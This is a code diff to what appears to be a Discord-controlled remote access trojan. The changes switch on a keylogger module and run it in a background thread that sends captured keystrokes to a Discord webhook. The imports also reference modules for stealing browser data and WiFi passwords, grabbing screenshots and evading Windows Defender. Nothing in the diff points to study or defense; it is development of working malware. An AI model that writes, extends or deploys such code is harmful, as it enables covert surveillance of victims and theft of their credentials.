@@ -1,11 +1,11 @@
-import os, discord, subprocess, requests, ctypes, zipfile, shutil#, sys
+import os, discord, subprocess, requests, ctypes, zipfile, threading
 from PIL import ImageGrab, Image
 import cv2
 from tkinter import messagebox
 import sys
 from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE#, ANTIDEBUG
 from modules.browser import run, delete_files
-#from modules.keylogger import Keylogger
+from modules.keylogger import Keylogger
 #from modules.antidebug import Antidebug
 from modules.info import start
 from modules.wifi import WifiPasswords
@@ -205,6 +205,9 @@ async def on_message(message):
     if message.channel.name != session_id:
         return
 
+    if message.webhook_id is not None:
+        return
+    
     if message.content == "help":
         embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
@@ -509,6 +512,9 @@ async def on_message(message):
         try:
             webhook = await message.channel.create_webhook(name="Keylogger")
             await message.reply(f"Created webhook, using URL: {webhook.url}")
+            keylogger = threading.Thread(target=Keylogger(webhook.url).run)
+            keylogger.start()
+            
             #Keylogger(webhook.url).run()
         except:
             await message.reply(f"Failed to create new webhook!")
